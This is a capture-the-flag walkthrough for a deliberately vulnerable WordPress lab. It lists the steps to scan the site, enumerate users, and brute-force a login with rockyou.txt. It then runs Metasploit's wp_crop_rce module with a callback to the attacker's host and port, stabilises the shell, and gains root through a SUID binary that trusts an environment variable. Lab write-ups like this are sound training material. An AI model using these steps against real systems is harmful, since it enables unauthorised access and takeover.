## Wordpress Blog Room from Try Hack Me.

## Difficulty: Medium

When we first paste the ip in google we come to a website called Billy Joels IT Blog

If we take a look around the page we see that it is running the CMS (Content Management System) Wordpress.

![image](https://user-images.githubusercontent.com/66257304/131880040-697415e7-172d-4efb-b939-d2cb5d1327a2.png)

Using this information we can answer question number 4, What CMS was Billy using?

# Nmap Scan

We should run an Nmap scan so we know all the open ports on the machine, This can be done by using the command, `nmap -sC -sV [IP]`, with [IP] being the ip address of the machine.

After a while this will return a long list of open ports.

![image](https://user-images.githubusercontent.com/66257304/131881935-a228cd04-860b-4ca1-920a-ae54f1e80585.png)

As we can see it has port 80 open, which is running the web page, port 22 which is running ssh, this is what we will connect to when we have the credentials to, we also have ports 139 & 445 open which is samba, to learn more about samba shares, you can go to this link https://www.samba.org/samba/docs/SambaIntro.html.

# Gobuster

To see if there are any hidden directories or files we can run a Gobuster Scan using the command, `gobuster dir -u "http://[IP]" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`

This will return a list of directories which were found.

![image](https://user-images.githubusercontent.com/66257304/131883517-f94ee892-a1d0-4410-9e1f-e8dd1c4a1d1a.png)

We are most interested in /login which brings us to the wordpress login page.

![image](https://user-images.githubusercontent.com/66257304/131883946-e0e5ed2c-4b60-46d5-a3b8-c39028d88d4d.png)

# wpscan

wpscan is a great tool made by wordpress to test the security of wordpress websites, we can use it to check if there are any other things we missed, we can use the command `wpscan --url http://[IP] --enumerate u`

--enumerate u is used to try and find the users.

We see there are two users, bjoel and kwheel.

![image](https://user-images.githubusercontent.com/66257304/131889715-52275fbc-a13a-41e1-b3ba-bb0d5a876f0b.png)

We also see there is a robots.txt file.

![image](https://user-images.githubusercontent.com/66257304/131884524-198458bc-7a10-47da-821e-7bec5ce22e35.png)

If we go to it we see, 

![image](https://user-images.githubusercontent.com/66257304/131884680-46501f8b-6a9e-4811-875f-a5e711a86f67.png)

This means that the file `/wp-admin/admin-ajax.php` is readable by us, and if we go to it we see,

![image](https://user-images.githubusercontent.com/66257304/131884843-e2fc97e0-c623-48a5-b441-7144eac6825c.png)

Seemingly a dead end...

If we keep looking at the output we see the wordpress version being used is 5.0.

![image](https://user-images.githubusercontent.com/66257304/131885006-9e87738e-9fa9-4a3e-bc06-93b4311b150d.png)

This is the answer to question number 5, What version of the above CMS was being used?

Now we can bruteforce bjoel and kwheel's login passwords, since we know his username we can use a wordlist like rockyou.txt, this is pre-installed on kali in the directory `/usr/share/wordlists/rockyou.txt`, if you do not have it, you can download it from this link https://dekisoft.com/rockyou-txt-gz-password-list-download/.

To bruteforce their passwords we will be using wpscan's built in bruteforcer, we can do this by using the command `wpscan --url http://10.10.66.164 --password-attack wp-login -U bjoel,kwheel -P /usr/share/wordlists/rockyou.txt`.

SUCCESS!!

We find that kwheel's password is cutiepie1.

![image](https://user-images.githubusercontent.com/66257304/131890570-c9fed0ba-1216-41a6-b273-86b482c0ad40.png)

With this info, we can now login to her account.

We're in!

Now we can search for some exploits, since we know this website is using wordpress version 5.0, we can use the command `searchsploit wordpress 5.0`.

We see there a quite a few results but the one that catches my eye is this.

![image](https://user-images.githubusercontent.com/66257304/131892290-3f05b699-31eb-4d3e-a962-adc839821cbd.png)

To use this we need to start up metasploit and search for it using the command `search crop-image`.

Then we need to use the exploit by using the command `use exploit/multi/http/wp_crop_rce`.

Now we need to set the parameters, to see them use the command `show options`, for this we need to change the, password, RHOSTS, username, LHOSTS and LPORT, to change these use the command `set password cutiepie1`, `set RHOSTS [IP]`, `set username kwheel`, `set LHOSTS [YOUR IP]` and `set LPORT 4444`.

Now we can use the command `exploit` to run the exploit.

When the exploit completes we will see this screen. 

![image](https://user-images.githubusercontent.com/66257304/131910788-9c4733e0-2ac8-46ac-ab22-f8dec23c0a56.png)

Then we run the command `shell` to get into a shell

Now we need to stabilise the shell so we can use bash commands, this can be done by running the command `python -c 'import pty; pty.spawn("/bin/sh")'`

We are now on the machine as the user www-data, usually if we were to navigate to /home/bjoel the user flag would be there but when we cat the file out we get this.

![image](https://user-images.githubusercontent.com/66257304/131911443-6ba7195d-0686-4d8a-aeef-3e8c880f7447.png)

So we are going to have to do some privelage escalation, we can check for SUID Binarys by running the command `find / -perm -u=s -type f 2>/dev/null`.

We see an unusual output.

![image](https://user-images.githubusercontent.com/66257304/131911718-da7831af-15f5-4be8-a0b5-8d5935d0f045.png)

Lets take a look at this, we can use the command `ltrace checker` to see what it actually does.

![image](https://user-images.githubusercontent.com/66257304/131911861-49b2593d-c932-4f33-b353-994673bbde4d.png)

Hmmmm, seems that it gets the admin environment variable and prints out "Not Admin" , so what if we change this variable?

Run the command `export admin=1`.

Seems that changed the variable...

![image](https://user-images.githubusercontent.com/66257304/131912141-63712d34-151e-4469-a5d4-22f89ca8413e.png)

What if we run checker now, what will it do, run the command `checker`.

And BOOM!, we are root.

![image](https://user-images.githubusercontent.com/66257304/131912236-6db90137-9c75-4f9a-b81d-ccce61e06335.png)

Okay, now we are root we need to find the flags to finish off the machine.

We can easily get the root flag by navigating to /root/root.txt

Now we need to find the user flag, to do this we need to run the command `find / 2>/dev/null | grep user.txt` which checks all the files on the system and checks if it is called user.txt and if it is not, it is ignored, so now we know where the user flag is, we can submit the flags and where we found it to finish the last 2 questions.

Well Done!







